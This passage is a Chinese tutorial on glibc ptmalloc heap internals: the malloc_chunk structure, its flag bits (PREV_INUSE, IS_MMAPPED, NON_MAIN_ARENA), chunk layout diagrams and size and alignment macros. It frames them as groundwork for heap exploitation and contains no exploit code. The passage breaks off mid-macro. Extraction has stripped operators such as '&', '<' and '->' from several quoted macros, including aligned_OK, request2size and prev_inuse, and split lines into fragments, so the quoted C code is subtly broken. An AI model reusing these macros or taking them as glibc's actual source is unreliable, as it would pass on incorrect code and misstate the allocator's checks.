            "text": "\u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784\n\n\n\u5806\u7684\u64cd\u4f5c\u5c31\u8fd9\u4e48\u590d\u6742\uff0c\u90a3\u4e48\u5728 glibc \u5185\u90e8\u5fc5\u7136\u4e5f\u6709\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u6570\u636e\u7ed3\u6784\u6765\u7ba1\u7406\u5b83\u3002\u4e0e\u5806\u76f8\u5e94\u7684\u6570\u636e\u7ed3\u6784\u4e3b\u8981\u5206\u4e3a\n\n\n\n\n\u5b8f\u89c2\u7ed3\u6784\uff0c\u5305\u542b\u5806\u7684\u5b8f\u89c2\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u7d22\u5f15\u5806\u7684\u57fa\u672c\u4fe1\u606f\u3002\n\n\n\u5fae\u89c2\u7ed3\u6784\uff0c\u7528\u4e8e\u5177\u4f53\u5904\u7406\u5806\u7684\u5206\u914d\u4e0e\u56de\u6536\u4e2d\u7684\u5185\u5b58\u5757\u3002\n\n\n\n\nOverview\uff1f\uff1f\uff1f\uff1f\n\n\n\u8fd9\u91cc\u7ed9\u4e00\u4e2a\u5b8f\u89c2\u7684\u56fe\u7247\u3002\n\n\n\u5fae\u89c2\u7ed3\u6784\n\n\n\u8fd9\u91cc\u9996\u5148\u4ecb\u7ecd\u5806\u4e2d\u6bd4\u8f83\u7ec6\u8282\u7684\u7ed3\u6784\uff0c\n\u5806\u7684\u6f0f\u6d1e\u5229\u7528\u4e0e\u8fd9\u4e9b\u7ed3\u6784\u5bc6\u5207\u76f8\u5173\n\u3002\n\n\nmalloc_chunk\n\n\n\u6982\u8ff0\n\n\n\u5728\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u79f0\u7531 malloc \u7533\u8bf7\u7684\u5185\u5b58\u4e3a chunk \u3002\u8fd9\u5757\u5185\u5b58\u5728 ptmalloc \u5185\u90e8\u7528 malloc_chunk \u7ed3\u6784\u4f53\u6765\u8868\u793a\u3002\u5f53\u7a0b\u5e8f\u7533\u8bf7\u7684 chunk \u88ab free \u540e\uff0c\u4f1a\u88ab\u52a0\u5165\u5230\u76f8\u5e94\u7684\u7a7a\u95f2\u7ba1\u7406\u5217\u8868\u4e2d\u3002\n\n\n\u975e\u5e38\u6709\u610f\u601d\u7684\u662f\uff0c\n\u65e0\u8bba\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u5982\u4f55\uff0c\u5904\u4e8e\u5206\u914d\u72b6\u6001\u8fd8\u662f\u91ca\u653e\u72b6\u6001\uff0c\u5b83\u4eec\u90fd\u4f7f\u7528\u4e00\u4e2a\u7edf\u4e00\u7684\u7ed3\u6784\n\u3002\u867d\u7136\u5b83\u4eec\u4f7f\u7528\u4e86\u540c\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u6839\u636e\u662f\u5426\u88ab\u91ca\u653e\uff0c\u5b83\u4eec\u7684\u8868\u73b0\u5f62\u5f0f\u4f1a\u6709\u6240\u4e0d\u540c\u3002\n\n\nmalloc_chunk \u7684\u7ed3\u6784\u5982\u4e0b\n\n\n/*\n\n\n  This struct declaration is misleading (but accurate and necessary).\n\n\n  It declares a \nview\n into memory allowing access to necessary\n\n\n  fields at known offsets from a given base. See explanation below.\n\n\n*/\n\n\nstruct\n \nmalloc_chunk\n \n{\n\n\n  \nINTERNAL_SIZE_T\n      \nprev_size\n;\n  \n/* Size of previous chunk (if free).  */\n\n  \nINTERNAL_SIZE_T\n      \nsize\n;\n       \n/* Size in bytes, including overhead. */\n\n\n  \nstruct\n \nmalloc_chunk\n*\n \nfd\n;\n         \n/* double links -- used only if free. */\n\n  \nstruct\n \nmalloc_chunk\n*\n \nbk\n;\n\n\n  \n/* Only used for large blocks: pointer to next larger size.  */\n\n  \nstruct\n \nmalloc_chunk\n*\n \nfd_nextsize\n;\n \n/* double links -- used only if free. */\n\n  \nstruct\n \nmalloc_chunk\n*\n \nbk_nextsize\n;\n\n\n};\n\n\n\n\n\n\u9996\u5148\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e9b\u5fc5\u8981\u7684\u89e3\u91ca INTERNAL_SIZE_T\uff0cSIZE_SZ\uff0cMALLOC_ALIGN_MASK\uff1a\n\n\n/* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of\n\n\n   chunk sizes.\n\n\n   The default version is the same as size_t.\n\n\n   While not strictly necessary, it is best to define this as an\n\n\n   unsigned type, even if size_t is a signed type. This may avoid some\n\n\n   artificial size limitations on some systems.\n\n\n   On a 64-bit machine, you may be able to reduce malloc overhead by\n\n\n   defining INTERNAL_SIZE_T to be a 32 bit `unsigned int\n at the\n\n\n   expense of not being able to handle more than 2^32 of malloced\n\n\n   space. If this limitation is acceptable, you are encouraged to set\n\n\n   this unless you are on a platform requiring 16byte alignments. In\n\n\n   this case the alignment requirements turn out to negate any\n\n\n   potential advantages of decreasing size_t word size.\n\n\n   Implementors: Beware of the possible combinations of:\n\n\n     - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits,\n\n\n       and might be the same width as int or as long\n\n\n     - size_t might have different width and signedness as INTERNAL_SIZE_T\n\n\n     - int and long might be 32 or 64 bits, and might be the same width\n\n\n   To deal with this, most comparisons and difference computations\n\n\n   among INTERNAL_SIZE_Ts should cast them to unsigned long, being\n\n\n   aware of the fact that casting an unsigned int to a wider long does\n\n\n   not sign-extend. (This also makes checking for negative numbers\n\n\n   awkward.) Some of these casts result in harmless compiler warnings\n\n\n   on some systems.  */\n\n\n#ifndef INTERNAL_SIZE_T\n\n\n# define INTERNAL_SIZE_T size_t\n\n\n#endif\n\n\n\n/* The corresponding word size.  */\n\n\n#define SIZE_SZ (sizeof (INTERNAL_SIZE_T))\n\n\n\n/* The corresponding bit mask value.  */\n\n\n#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)\n\n\n\n\n\n\u4e00\u822c\u6765\u8bf4\uff0csize_t \u5728 64 \u4f4d\u4e2d\u662f 64 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff0c32 \u4f4d\u4e2d\u662f 32 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\u3002\n\n\n\u6bcf\u4e2a\u5b57\u6bb5\u7684\u5177\u4f53\u7684\u89e3\u91ca\u5982\u4e0b\n\n\n\n\nprev_size\n,  \u5982\u679c\u8be5 chunk \u7684\n\u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u5730\u5740chunk\uff08\u4e24\u4e2a\u6307\u9488\u7684\u5730\u5740\u5dee\u503c\u4e3a\u524d\u4e00chunk\u5927\u5c0f\uff09\n\u662f\u7a7a\u95f2\u7684\u8bdd\uff0c\u90a3\u8be5\u5b57\u6bb5\u8bb0\u5f55\u7684\u662f\u524d\u4e00\u4e2a chunk \u7684\u5927\u5c0f(\u5305\u62ec chunk \u5934)\u3002\u5426\u5219\uff0c\u8be5\u5b57\u6bb5\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u4e2achunk \u7684\u6570\u636e\u3002\n\u8fd9\u91cc\u7684\u524d\u4e00 chunk \u6307\u7684\u662f\u8f83\u4f4e\u5730\u5740\u7684 chunk \n\u3002\n\n\nsize\n \uff0c\u8be5 chunk \u7684\u5927\u5c0f\uff0c\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\u3002\u5982\u679c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0d\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\uff0c\u4f1a\u88ab\u8f6c\u6362\u6ee1\u8db3\u5927\u5c0f\u7684\u6700\u5c0f\u7684 2 * SIZE_SZ \u7684\u500d\u6570\u300232 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 4\uff1b64 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 8\u3002 \u8be5\u5b57\u6bb5\u7684\u4f4e\u4e09\u4e2a\u6bd4\u7279\u4f4d\u5bf9 chunk \u7684\u5927\u5c0f\u6ca1\u6709\u5f71\u54cd\uff0c\u5b83\u4eec\u4ece\u9ad8\u5230\u4f4e\u5206\u522b\u8868\u793a\n\n\nNON_MAIN_ARENA\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u4e0d\u5c5e\u4e8e\u4e3b\u7ebf\u7a0b\uff0c1\u8868\u793a\u4e0d\u5c5e\u4e8e\uff0c0\u8868\u793a\u5c5e\u4e8e\u3002\n\n\nIS_MAPPED\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u662f\u7531 mmap \u5206\u914d\u7684\u3002 \n\n\nPREV_INUSE\uff0c\u8bb0\u5f55\u524d\u4e00\u4e2a chunk \u5757\u662f\u5426\u88ab\u5206\u914d\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5806\u4e2d\u7b2c\u4e00\u4e2a\u88ab\u5206\u914d\u7684\u5185\u5b58\u5757\u7684 size \u5b57\u6bb5\u7684P\u4f4d\u90fd\u4f1a\u88ab\u8bbe\u7f6e\u4e3a1\uff0c\u4ee5\u4fbf\u4e8e\u9632\u6b62\u8bbf\u95ee\u524d\u9762\u7684\u975e\u6cd5\u5185\u5b58\u3002\u5f53\u4e00\u4e2a chunk \u7684 size \u7684 P \u4f4d\u4e3a 0 \u65f6\uff0c\u6211\u4eec\u80fd\u901a\u8fc7 prev_size \u5b57\u6bb5\u6765\u83b7\u53d6\u4e0a\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u5730\u5740\u3002\u8fd9\u4e5f\u65b9\u4fbf\u8fdb\u884c\u7a7a\u95f2chunk\u4e4b\u95f4\u7684\u5408\u5e76\u3002\n\n\n\n\n\n\nfd\uff0cbk\n\u3002 chunk \u5904\u4e8e\u5206\u914d\u72b6\u6001\u65f6\uff0c\u4ece fd \u5b57\u6bb5\u5f00\u59cb\u662f\u7528\u6237\u7684\u6570\u636e\u3002chunk \u7a7a\u95f2\u65f6\uff0c\u4f1a\u88ab\u6dfb\u52a0\u5230\u5bf9\u5e94\u7684\u7a7a\u95f2\u7ba1\u7406\u94fe\u8868\u4e2d\uff0c\u5176\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b\n\n\nfd \u6307\u5411\u4e0b\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk\n\n\nbk \u6307\u5411\u4e0a\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk\n\n\n\u901a\u8fc7 fd \u548c bk \u53ef\u4ee5\u5c06\u7a7a\u95f2\u7684 chunk \u5757\u52a0\u5165\u5230\u7a7a\u95f2\u7684 chunk \u5757\u94fe\u8868\u8fdb\u884c\u7edf\u4e00\u7ba1\u7406\n\n\n\n\n\n\nfd_nextsize\uff0c bk_nextsize\n\uff0c\u4e5f\u662f\u53ea\u6709 chunk \u7a7a\u95f2\u7684\u65f6\u5019\u624d\u4f7f\u7528\uff0c\u4e0d\u8fc7\u5176\u7528\u4e8e\u8f83\u5927\u7684 chunk\uff08large chunk\uff09\u3002\n\n\nfd_nextsize \u6307\u5411\u524d\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002\n\n\nbk_nextsize \u6307\u5411\u540e\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002\n\n\n\u4e00\u822c\u7a7a\u95f2\u7684 large chunk \u5728 fd \u7684\u904d\u5386\u987a\u5e8f\u4e2d\uff0c\u6309\u7167\u7531\u5927\u5230\u5c0f\u7684\u987a\u5e8f\u6392\u5217\u3002\n\u8fd9\u6837\u505a\u53ef\u4ee5\u907f\u514d\u5728\u5bfb\u627e\u5408\u9002chunk \u65f6\u6328\u4e2a\u904d\u5386\u3002\n\n\n\n\n\n\n\n\n\u4e00\u4e2a\u5df2\u7ecf\u5206\u914d\u7684 chunk \u7684\u6837\u5b50\u5982\u4e0b\u3002\n\u6211\u4eec\u79f0\u524d\u4e24\u4e2a\u5b57\u6bb5\u79f0\u4e3a chunk header\uff0c\u540e\u9762\u7684\u90e8\u5206\u79f0\u4e3auser data\u3002\u6bcf\u6b21 malloc \u7533\u8bf7\u5f97\u5230\u7684\u5185\u5b58\u6307\u9488\uff0c\u5176\u5b9e\u6307\u5411user data\u7684\u8d77\u59cb\u5904\u3002\n \n\n\n\u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u57df\u65e0\u6548\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a chunk \u7684\u8be5\u90e8\u5206\u4e5f\u53ef\u4ee5\u88ab\u5f53\u524dchunk\u4f7f\u7528\u3002\n\u8fd9\u5c31\u662fchunk\u4e2d\u7684\u7a7a\u95f4\u590d\u7528\u3002\n\n\nchunk\n-\n \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nSize\n \nof\n \nprevious\n \nchunk\n,\n \nif\n \nunallocated\n \n(\nP\n \nclear\n)\n  \n|\n\n        \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nSize\n \nof\n \nchunk\n,\n \nin\n \nbytes\n                     \n|\nA\n|\nM\n|\nP\n|\n\n  \nmem\n-\n \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nUser\n \ndata\n \nstarts\n \nhere\n...\n                          \n.\n\n        \n.\n                                                               \n.\n\n        \n.\n             \n(\nmalloc_usable_size\n()\n \nbytes\n)\n                      \n.\n\n\nnext\n    \n.\n                                                               \n|\n\n\nchunk\n-\n \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \n(\nsize\n \nof\n \nchunk\n,\n \nbut\n \nused\n \nfor\n \napplication\n \ndata\n)\n    \n|\n\n        \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nSize\n \nof\n \nnext\n \nchunk\n,\n \nin\n \nbytes\n                \n|\nA\n|\n0\n|\n1\n|\n\n        \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n\n\n\n\n\u88ab\u91ca\u653e\u7684 chunk \u88ab\u8bb0\u5f55\u5728\u94fe\u8868\u4e2d\uff08\u53ef\u80fd\u662f\u5faa\u73af\u53cc\u5411\u94fe\u8868\uff0c\u4e5f\u53ef\u80fd\u662f\u5355\u5411\u94fe\u8868\uff09\u3002\u5177\u4f53\u7ed3\u6784\u5982\u4e0b\n\n\nchunk\n-\n \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nSize\n \nof\n \nprevious\n \nchunk\n,\n \nif\n \nunallocated\n \n(\nP\n \nclear\n)\n  \n|\n\n        \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n\n`\nhead\n:\n \n|\n             \nSize\n \nof\n \nchunk\n,\n \nin\n \nbytes\n                     \n|\nA\n|\n0\n|\nP\n|\n\n  \nmem\n-\n \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nForward\n \npointer\n \nto\n \nnext\n \nchunk\n \nin\n \nlist\n             \n|\n\n        \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nBack\n \npointer\n \nto\n \nprevious\n \nchunk\n \nin\n \nlist\n            \n|\n\n        \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nUnused\n \nspace\n \n(\nmay\n \nbe\n \n0\n \nbytes\n \nlong\n)\n                \n.\n\n        \n.\n                                                               \n.\n\n \nnext\n   \n.\n                                                               \n|\n\n\nchunk\n-\n \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n\n`\nfoot\n:\n \n|\n             \nSize\n \nof\n \nchunk\n,\n \nin\n \nbytes\n                           \n|\n\n        \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nSize\n \nof\n \nnext\n \nchunk\n,\n \nin\n \nbytes\n                \n|\nA\n|\n0\n|\n0\n|\n\n        \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n\n\n\n\n\u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u4e00\u4e2a chunk \u5904\u4e8e free \u72b6\u6001\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u4e2a\u4f4d\u7f6e\u8bb0\u5f55\u5176\u76f8\u5e94\u7684\u5927\u5c0f\n\n\n\n\n\n\n\u672c\u8eab\u7684size\u5b57\u6bb5\u4f1a\u8bb0\u5f55\uff0c\n\n\n\n\n\n\n\u5b83\u540e\u9762\u7684 chunk \u4f1a\u8bb0\u5f55\u3002\n\n\n\n\n\n\n\u4e00\u822c\u60c5\u51b5\u4e0b\n\uff0c\u7269\u7406\u76f8\u90bb\u7684\u4e24\u4e2a\u7a7a\u95f2 chunk \u4f1a\u88ab\u5408\u5e76\u4e3a\u4e00\u4e2a chunk \u3002\u5806\u7ba1\u7406\u5668\u4f1a\u901a\u8fc7 prev_size \u5b57\u6bb5\u4ee5\u53ca size \u5b57\u6bb5\u5408\u5e76\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5757\u3002\n\n\n\uff01\uff01\uff01\u4e00\u4e9b\u5173\u4e8e\u5806\u7684\u7ea6\u675f\uff0c\u540e\u9762\u8be6\u7ec6\u8003\u8651\uff01\uff01\uff01\n\n\n/*\n\n\n    The three exceptions to all this are:\n\n\n     1. The special chunk `top\n doesn\nt bother using the\n\n\n    trailing size field since there is no next contiguous chunk\n\n\n    that would have to index off it. After initialization, `top\n\n\n    is forced to always exist.  If it would become less than\n\n\n    MINSIZE bytes long, it is replenished.\n\n\n     2. Chunks allocated via mmap, which have the second-lowest-order\n\n\n    bit M (IS_MMAPPED) set in their size fields.  Because they are\n\n\n    allocated one-by-one, each must contain its own trailing size\n\n\n    field.  If the M bit is set, the other bits are ignored\n\n\n    (because mmapped chunks are neither in an arena, nor adjacent\n\n\n    to a freed chunk).  The M bit is also used for chunks which\n\n\n    originally came from a dumped heap via malloc_set_state in\n\n\n    hooks.c.\n\n\n     3. Chunks in fastbins are treated as allocated chunks from the\n\n\n    point of view of the chunk allocator.  They are consolidated\n\n\n    with their neighbors only in bulk, in malloc_consolidate.\n\n\n*/\n\n\n\n\n\nchunk\u76f8\u5173\u5b8f\n\n\n\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd chunk \u7684\u5927\u5c0f\u3001\u5bf9\u9f50\u68c0\u67e5\u4ee5\u53ca\u4e00\u4e9b\u8f6c\u6362\u7684\u5b8f\u3002\n\n\nchunk \u4e0e mem \u6307\u9488\u5934\u90e8\u7684\u8f6c\u6362\n\n\nmem\u6307\u5411\u7528\u6237\u5f97\u5230\u7684\u5185\u5b58\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002\n\n\n/* conversion from malloc headers to user pointers, and back */\n\n\n#define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))\n\n\n#define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))\n\n\n\n\n\n\u6700\u5c0f\u7684 chunk \u5927\u5c0f\n\n\n/* The smallest possible chunk */\n\n\n#define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))\n\n\n\n\n\n\u8fd9\u91cc\uff0coffsetof \u51fd\u6570\u8ba1\u7b97\u51fa fd_nextsize \u5728 malloc_chunk \u4e2d\u7684\u504f\u79fb\uff0c\u8bf4\u660e\u6700\u5c0f\u7684 chunk \u81f3\u5c11\u8981\u5305\u542b bk \u6307\u9488\u3002\n\n\n\u6700\u5c0f\u7533\u8bf7\u7684\u5806\u5185\u5b58\u5927\u5c0f\n\n\n\u7528\u6237\u6700\u5c0f\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6700\u5c0f\u6574\u6570\u500d\u3002\n\n\n\u6ce8\uff1a\u5c31\u76ee\u524d\u800c\u770b MIN_CHUNK_SIZE \u548c MINSIZE \u5927\u5c0f\u662f\u4e00\u81f4\u7684\uff0c\u4e2a\u4eba\u8ba4\u4e3a\u4e4b\u6240\u4ee5\u8981\u6dfb\u52a0\u4e24\u4e2a\u5b8f\u662f\u4e3a\u4e86\u65b9\u4fbf\u4ee5\u540e\u4fee\u6539 malloc_chunk \u65f6\u65b9\u4fbf\u4e00\u4e9b\u3002\n\n\n/* The smallest size we can malloc is an aligned minimal chunk */\n\n\n//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1\n\n\n#define MINSIZE                                                                \\\n\n\n    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) \n                   \\\n\n\n                      ~MALLOC_ALIGN_MASK))\n\n\n\n\n\n\u68c0\u67e5\u5206\u914d\u7ed9\u7528\u6237\u7684\u5185\u5b58\u662f\u5426\u5bf9\u9f50\n\n\n2 * SIZE_SZ \u5927\u5c0f\u5bf9\u9f50\u3002\n\n\n/* Check if m has acceptable alignment */\n\n\n// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1\n\n\n#define aligned_OK(m) (((unsigned long) (m) \n MALLOC_ALIGN_MASK) == 0)\n\n\n\n#define misaligned_chunk(p)                                                    \\\n\n\n    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) \n       \\\n\n\n     MALLOC_ALIGN_MASK)\n\n\n\n\n\n\u8bf7\u6c42\u5b57\u8282\u6570\u5224\u65ad\n\n\n/*\n\n\n   Check if a request is so large that it would wrap around zero when\n\n\n   padded and aligned. To simplify some other code, the bound is made\n\n\n   low enough so that adding MINSIZE will also not wrap around zero.\n\n\n */\n\n\n\n#define REQUEST_OUT_OF_RANGE(req)                                              \\\n\n\n    ((unsigned long) (req) \n= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))\n\n\n\n\n\n\u5c06\u7528\u6237\u8bf7\u6c42\u5185\u5b58\u5927\u5c0f\u8f6c\u4e3a\u5b9e\u9645\u5206\u914d\u5185\u5b58\u5927\u5c0f\n\n\n/* pad request bytes into a usable size -- internal version */\n\n\n//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1\n\n\n#define request2size(req)                                                      \\\n\n\n    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \n MINSIZE)                           \\\n\n\n         ? MINSIZE                                                             \\\n\n\n         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \n ~MALLOC_ALIGN_MASK)\n\n\n\n/*  Same, except also perform argument check */\n\n\n\n#define checked_request2size(req, sz)                                          \\\n\n\n    if (REQUEST_OUT_OF_RANGE(req)) {                                           \\\n\n\n        __set_errno(ENOMEM);                                                   \\\n\n\n        return 0;                                                              \\\n\n\n    }                                                                          \\\n\n\n    (sz) = request2size(req);\n\n\n\n\n\n\u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u5df2\u5206\u914d\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u5fc5\u7136\u662f\u65e0\u6548\u7684\uff0c\u6545\u800c\u8fd9\u4e2a\u5b57\u6bb5\u5c31\u53ef\u4ee5\u88ab\u5f53\u524d\u8fd9\u4e2a chunk \u4f7f\u7528\u3002\u8fd9\u5c31\u662f ptmalloc \u4e2d chunk \u95f4\u7684\u590d\u7528\u3002\u5177\u4f53\u6d41\u7a0b\u5982\u4e0b\n\n\n\n\n\u9996\u5148\uff0c\u5229\u7528 REQUEST_OUT_OF_RANGE \u5224\u65ad\u662f\u5426\u53ef\u4ee5\u5206\u914d\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u5927\u5c0f\u7684 chunk\u3002\n\n\n\u5176\u6b21\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u662f\u7528\u6765\u5b58\u50a8\u6570\u636e\u7684\uff0c\u5373 chunk header \u540e\u9762\u7684\u90e8\u5206\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8echunk \u95f4\u590d\u7528\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u3002\u56e0\u6b64\uff0c\u8fd9\u91cc\u53ea\u9700\u8981\u518d\u6dfb\u52a0 SIZE_SZ \u5927\u5c0f\u5373\u53ef\u4ee5\u5b8c\u5168\u5b58\u50a8\u5185\u5bb9\u3002\n\n\n\u7531\u4e8e\u7cfb\u7edf\u4e2d\u6240\u5141\u8bb8\u7684\u7533\u8bf7\u7684 chunk \u6700\u5c0f\u662f MINSIZE\uff0c\u6240\u4ee5\u4e0e\u5176\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u4e0d\u6ee1\u8db3\u6700\u4f4e\u8981\u6c42\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u76f4\u63a5\u5206\u914dMINSIZE\u5b57\u8282\u3002\n\n\n\u5982\u679c\u5927\u4e8e\u7684\u8bdd\uff0c\u56e0\u4e3a\u7cfb\u7edf\u4e2d\u7533\u8bf7\u7684 chunk \u9700\u8981 2 * SIZE_SZ \u5bf9\u9f50\uff0c\u6240\u4ee5\u8fd9\u91cc\u9700\u8981\u52a0\u4e0aMALLOC_ALIGN_MASK \u4ee5\u4fbf\u4e8e\u5bf9\u9f50\u3002\n\n\n\n\n\u4e2a\u4eba\u8ba4\u4e3a\uff0c\u8fd9\u91cc\u5728 request2size \u7684\u5b8f\u7684\u7b2c\u4e00\u884c\u4e2d\u6ca1\u6709\u5fc5\u8981\u52a0\u4e0a MALLOC_ALIGN_MASK\u3002\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u901a\u8fc7\u8fd9\u6837\u7684\u8ba1\u7b97\u516c\u5f0f\u5f97\u5230\u7684 size \u6700\u7ec8\u4e00\u5b9a\u662f\u6ee1\u8db3\u7528\u6237\u9700\u8981\u7684\u3002\n\n\n\u6807\u8bb0\u4f4d\u76f8\u5173\n\n\n/* size field is or\ned with PREV_INUSE when previous adjacent chunk in use */\n\n\n#define PREV_INUSE 0x1\n\n\n\n/* extract inuse bit of previous chunk */\n\n\n#define prev_inuse(p) ((p)-\nmchunk_size \n PREV_INUSE)\n\n\n\n/* size field is or\ned with IS_MMAPPED if the chunk was obtained with mmap() */\n\n\n#define IS_MMAPPED 0x2\n\n\n\n/* check for mmap()\ned chunk */\n\n\n#define chunk_is_mmapped(p) ((p)-\nmchunk_size \n IS_MMAPPED)\n\n\n\n/* size field is or\ned with NON_MAIN_ARENA if the chunk was obtained\n\n\n   from a non-main arena.  This is only set immediately before handing\n\n\n   the chunk to the user, if necessary.  */\n\n\n#define NON_MAIN_ARENA 0x4\n\n\n\n/* Check for chunk from main arena.  */\n\n\n#define chunk_main_arena(p) (((p)-\nmchunk_size \n NON_MAIN_ARENA) == 0)\n\n\n\n/* Mark a chunk as not being on the main arena.  */\n\n\n#define set_non_main_arena(p) ((p)-\nmchunk_size |= NON_MAIN_ARENA)\n\n\n\n/*\n\n\n   Bits to mask off when extracting size\n\n\n   Note: IS_MMAPPED is intentionally not masked off from size field in\n\n\n   macros for which mmapped chunks should never be seen. This should\n\n\n   cause helpful core dumps to occur if it is tried by accident by\n\n\n   people extending or adapting this malloc.\n\n\n */\n\n\n#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)\n\n\n\n\n\n\u83b7\u53d6chunk size\n\n\n/* Get size, ignoring use bits */\n\n\n#define chunksize(p) (chunksize_nomask(p) \n ~(SIZE_BITS))\n\n\n\n/* Like chunksize, but do not mask SIZE_BITS.  */\n\n\n#define chunksize_nomask(p) 